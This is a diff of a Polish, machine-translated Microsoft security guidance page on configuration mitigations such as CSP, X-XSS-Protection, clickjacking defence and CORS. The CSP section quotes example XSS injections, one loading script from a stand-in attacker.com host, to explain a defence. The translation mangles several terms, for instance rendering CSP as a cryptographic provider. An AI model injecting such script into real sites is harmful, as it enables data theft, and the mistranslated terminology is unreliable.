@@ -14,12 +14,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 08/17/2017
 ms.author: rodsan
-ms.openlocfilehash: 1f3de9ba6615a9b2232cca237a822b308d89426d
-ms.sourcegitcommit: 9890483687a2b28860ec179f5fd0a292cdf11d22
+ms.openlocfilehash: cea96234083abd01cdf280129e6f75a1f69af9c6
+ms.sourcegitcommit: 150a40d8ba2beaf9e22b6feff414f8298a8ef868
 ms.translationtype: MT
 ms.contentlocale: pl-PL
-ms.lasthandoff: 01/24/2018
-ms.locfileid: "28019827"
+ms.lasthandoff: 06/27/2018
+ms.locfileid: "37028986"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Zabezpieczeń ramki: Zarządzanie konfiguracją | Środki zaradcze 
 | Produktów i usług | Artykuł |
@@ -42,7 +42,7 @@ ms.locfileid: "28019827"
 | **Faza SDL**               | Kompilacja |  
 | **Zastosowanie technologii** | Ogólny |
 | **Atrybuty**              | ND  |
-| **Odwołania**              | [Wprowadzenie do zasad zabezpieczeń zawartości](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [informacje o zasadach zabezpieczeń zawartości](http://content-security-policy.com/), [funkcje zabezpieczeń](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [wprowadzenie do zasad zabezpieczeń zawartości](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [Dostawcy usług Kryptograficznych można użyć?](http://caniuse.com/#feat=contentsecuritypolicy) |
+| **Odwołania**              | [Wprowadzenie do zasad zabezpieczeń zawartości](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [informacje o zasadach zabezpieczeń zawartości](http://content-security-policy.com/), [funkcje zabezpieczeń](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [wprowadzenie do zasad zabezpieczeń zawartości](https://docs.webplatform.org/wiki/tutorials/content-security-policy) , [Dostawcy usług Kryptograficznych można użyć?](http://caniuse.com/#feat=contentsecuritypolicy) |
 | **Kroki** | <p>Zasady zabezpieczeń zawartości (CSP) jest obrony zabezpieczeń mechanizm zabezpieczeń, standard, W3C umożliwiającą właściciele aplikacji sieci web kontrolę zawartości osadzone w lokacji. Dostawca usług Kryptograficznych jest dodawana jako nagłówka odpowiedzi HTTP, na serwerze sieci web i jest wymuszane po stronie klienta przez przeglądarki. Jest zasady na podstawie listy dozwolonych — witryny sieci Web mogą zadeklarować zestaw zaufanych domen, z którego zawartość, takich jak JavaScript może zostać załadowany.</p><p>Dostawca usług Kryptograficznych zapewnia następujące korzyści zabezpieczeń:</p><ul><li>**Ochrona przed XSS:** Jeśli strona jest podatny na XSS, osoba atakująca może wykorzystać go w sposób 2:<ul><li>Wstaw `<script>malicious code</script>`. Lukę nie będzie działać z powodu Base dostawcy usług Kryptograficznych dla ograniczeń-1.</li><li>Wstaw `<script src=”http://attacker.com/maliciousCode.js”/>`. Lukę nie będzie działać, ponieważ nie będzie kontrolowane przez osobę atakującą domeny w dostawcy usług Kryptograficznych w dozwolonych domen</li></ul></li><li>**Kontrolę nad danych exfiltration:** Jeśli żadnych złośliwej zawartości sieci Web próbuje podłączyć się do zewnętrznej witryny sieci Web i kradzieży danych, połączenie zostanie przerwane przez dostawcy usług Kryptograficznych. Wynika to z faktu w docelowej domenie nie będzie dozwolonych dostawcy usług chmury</li><li>**Obrony przed miejsca kliknij:** miejsca kliknij to technika ataku przy użyciu której atakujący dokonuje można ramkę oryginalnego użytkowników witryny sieci Web i Wymuś do kliknięcia elementy interfejsu użytkownika. Obecnie obrony przed miejsca kliknij osiągnięte przez skonfigurowanie odpowiedzi nagłówka X-Frame-Options. Nie wszystkie przeglądarki przestrzegać tego nagłówka i przechodzi do przodu dostawcy usług Kryptograficznych jest standardowym sposobem obrony przed miejsca kliknij</li><li>**Raportowanie w czasie rzeczywistym ataku:** w przypadku ataku polegającego na iniekcji w witrynie sieci Web z obsługą dostawcy usług Kryptograficznych, przeglądarek automatycznie wyzwoli powiadomienia punkt końcowy skonfigurowany na serwerze sieci Web. Dzięki temu dostawca usług Kryptograficznych służy jako system ostrzeżenie w czasie rzeczywistym.</li></ul> |
 
 ### <a name="example"></a>Przykład
@@ -75,7 +75,7 @@ Example: var str="alert(1)"; eval(str);
 | **Zastosowanie technologii** | Ogólny |
 | **Atrybuty**              | ND  |
 | **Odwołania**              | [Filtr XSS ochrony](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
-| **Kroki** | <p>Konfiguracja nagłówka odpowiedzi X XSS ochrony określa filtr skryptu krzyżowych w przeglądarce. Ten nagłówek odpowiedzi może mieć następujące wartości:</p><ul><li>`0:`Spowoduje to wyłączenie filtru</li><li>`1: Filter enabled`W przypadku wykrycia atak skryptowy między witrynami, aby zatrzymać ataku, przeglądarka będzie oczyszczenia strony</li><li>`1: mode=block : Filter enabled`. Zamiast niż oczyszczenia strony, po wykryciu ataków XSS, przeglądarka uniemożliwi renderowania strony</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. W przeglądarce zostanie oczyszczenia strony i Zgłoś naruszenie.</li></ul><p>Jest to funkcja chromu przy użyciu dostawcy usług Kryptograficznych naruszenie raportów szczegóły identyfikatora URI wybranych przez użytkownika. Opcje ostatnich 2 są uznawane za bezpieczne wartości.</p>|
+| **Kroki** | <p>Konfiguracja nagłówka odpowiedzi X XSS ochrony określa filtr skryptu krzyżowych w przeglądarce. Ten nagłówek odpowiedzi może mieć następujące wartości:</p><ul><li>`0:` Spowoduje to wyłączenie filtru</li><li>`1: Filter enabled` W przypadku wykrycia atak skryptowy między witrynami, aby zatrzymać ataku, przeglądarka będzie oczyszczenia strony</li><li>`1: mode=block : Filter enabled`. Zamiast niż oczyszczenia strony, po wykryciu ataków XSS, przeglądarka uniemożliwi renderowania strony</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. W przeglądarce zostanie oczyszczenia strony i Zgłoś naruszenie.</li></ul><p>Jest to funkcja chromu przy użyciu dostawcy usług Kryptograficznych naruszenie raportów szczegóły identyfikatora URI wybranych przez użytkownika. Opcje ostatnich 2 są uznawane za bezpieczne wartości.</p>|
 
 ## <a id="trace-deploy"></a>Aplikacji programu ASP.NET, należy wyłączyć śledzenie i debugowanie przed wdrożeniem
 
@@ -107,7 +107,7 @@ Example: var str="alert(1)"; eval(str);
 | **Faza SDL**               | Kompilacja |  
 | **Zastosowanie technologii** | Ogólny |
 | **Atrybuty**              | ND  |
-| **Odwołania**              | [Kliknij miejsca arkusza Cheat obrony OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [wewnętrzne IE - zwalczania miejsca kliknij z X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
+| **Odwołania**              | [Kliknij miejsca arkusza Cheat obrony OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [wewnętrzne IE - zwalczania miejsca kliknij z X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
 | **Kroki** | <p>Kliknij miejsca, znanej także jako "interfejsu użytkownika odwoławcze ataku", jest gdy osoba atakująca używa wielu warstw przezroczystego lub nieprzezroczystego do nakłonienia użytkownika do kliknięcie przycisku lub łącze na innej stronie, gdy zostały zamiar kliknij na stronie najwyższego poziomu.</p><p>To nakładanie warstw uzyskuje się poprzez obsługuje tworzenie niebezpieczną stronę z elementem iframe, który jest ładowany atakowanym strony. W związku z tym osoba atakująca "przejmuje" kliknięć przeznaczone dla ich strony i kierować ich do innej strony, najprawdopodobniej należących do innej aplikacji, domeny lub oba. Aby zapobiec miejsca kliknij ataków, ustaw odpowiednie nagłówków odpowiedzi HTTP X-Frame-Options zawierający instrukcje przeglądarkę, aby nie zezwolić ramek z innych domen</p>|
 
 ### <a name="example"></a>Przykład
@@ -143,7 +143,7 @@ Kod pliku Web.config dla witryny, które powinny być obramowane tylko przez str
 | **Zastosowanie technologii** | Web Forms, MVC5 |
 | **Atrybuty**              | ND  |
 | **Odwołania**              | ND  |
-| **Kroki** | <p>Poziom zabezpieczeń przeglądarki uniemożliwia wprowadzanie żądania AJAX do innej domeny przez stronę sieci web. To ograniczenie jest nazywany zasadami tego samego źródła i zapobiega złośliwa witryna odczytywanie danych poufnych z innej lokacji. Jednak czasami może być wymagane bezpieczne Uwidacznianie interfejsów API które innych witryn, jaką może wykorzystać. Krzyżowe CORS Origin Resource Sharing () jest standardem W3C, dzięki której serwer złagodzenie zasad tego samego źródła. Przy użyciu mechanizmu CORS, serwer można jawnie zezwolić na niektórych żądań cross-origin podczas odrzucenia innych użytkowników.</p><p>CORS jest bezpieczniejsze i bardziej elastyczne niż wcześniej technik, takich jak JSONP. Zasadniczo Włączanie mechanizmu CORS tłumaczy Dodawanie kilka nagłówków odpowiedzi HTTP (Access - Control-*) w sieci Web aplikacji, a to może odbywać się w na kilka sposobów.</p>|
+| **Kroki** | <p>Zabezpieczenia przeglądarki uniemożliwiają stronie internetowej wysyłanie żądań AJAX do innej domeny. To ograniczenie jest nazywany zasadami tego samego źródła i zapobiega złośliwa witryna odczytywanie danych poufnych z innej lokacji. Jednak czasami może być wymagane bezpieczne Uwidacznianie interfejsów API które innych witryn, jaką może wykorzystać. Krzyżowe CORS Origin Resource Sharing () jest standardem W3C, dzięki której serwer złagodzenie zasad tego samego źródła. Przy użyciu mechanizmu CORS, serwer można jawnie zezwolić na niektórych żądań cross-origin podczas odrzucenia innych użytkowników.</p><p>CORS jest bezpieczniejsze i bardziej elastyczne niż wcześniej technik, takich jak JSONP. Zasadniczo Włączanie mechanizmu CORS tłumaczy Dodawanie kilka nagłówków odpowiedzi HTTP (Access - Control-*) w sieci Web aplikacji, a to może odbywać się w na kilka sposobów.</p>|
 
 ### <a name="example"></a>Przykład
 Jeśli dostęp do pliku Web.config jest dostępny, CORS, mogą być dodawane przy użyciu następującego kodu: 
@@ -284,7 +284,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | ----------------------- | ------------ |
 | **Składnik**               | Database (Baza danych) | 
 | **Faza SDL**               | Kompilacja |  
-| **Zastosowanie technologii** | SQL Azure, OnPrem |
+| **Zastosowanie technologii** | Lokalnego programu SQL Azure |
 | **Atrybuty**              | N/d, SQL - 12 |
 | **Odwołania**              | [Jak skonfigurować zaporę bazy danych Azure SQL](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Konfigurowanie Zapory systemu Windows dla dostępu aparatu bazy danych](https://msdn.microsoft.com/library/ms175043) |
 | **Kroki** | Systemy zapory pomagać w zapobieganiu nieautoryzowanego dostępu do zasobów komputera. Aby uzyskać dostęp do wystąpienia aparatu bazy danych programu SQL Server przez zaporę, należy skonfigurować zaporę na komputerze z uruchomionym serwerem SQL, aby zezwolić na dostęp |
@@ -298,7 +298,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | **Zastosowanie technologii** | MVC 5 |
 | **Atrybuty**              | ND  |
 | **Odwołania**              | [Włączanie żądań Cross-Origin w składniku ASP.NET Web API 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API — Obsługa mechanizmu CORS w składniku ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
-| **Kroki** | <p>Poziom zabezpieczeń przeglądarki uniemożliwia wprowadzanie żądania AJAX do innej domeny przez stronę sieci web. To ograniczenie jest nazywany zasadami tego samego źródła i zapobiega złośliwa witryna odczytywanie danych poufnych z innej lokacji. Jednak czasami może być wymagane bezpieczne Uwidacznianie interfejsów API które innych witryn, jaką może wykorzystać. Krzyżowe CORS Origin Resource Sharing () jest standardem W3C, dzięki której serwer złagodzenie zasad tego samego źródła.</p><p>Przy użyciu mechanizmu CORS, serwer można jawnie zezwolić na niektórych żądań cross-origin podczas odrzucenia innych użytkowników. CORS jest bezpieczniejsze i bardziej elastyczne niż wcześniej technik, takich jak JSONP.</p>|
+| **Kroki** | <p>Zabezpieczenia przeglądarki uniemożliwiają stronie internetowej wysyłanie żądań AJAX do innej domeny. To ograniczenie jest nazywany zasadami tego samego źródła i zapobiega złośliwa witryna odczytywanie danych poufnych z innej lokacji. Jednak czasami może być wymagane bezpieczne Uwidacznianie interfejsów API które innych witryn, jaką może wykorzystać. Krzyżowe CORS Origin Resource Sharing () jest standardem W3C, dzięki której serwer złagodzenie zasad tego samego źródła.</p><p>Przy użyciu mechanizmu CORS, serwer można jawnie zezwolić na niektórych żądań cross-origin podczas odrzucenia innych użytkowników. CORS jest bezpieczniejsze i bardziej elastyczne niż wcześniej technik, takich jak JSONP.</p>|
 
 ### <a name="example"></a>Przykład
 W App_Start/WebApiConfig.cs Dodaj następujący kod do metody WebApiConfig.Register 
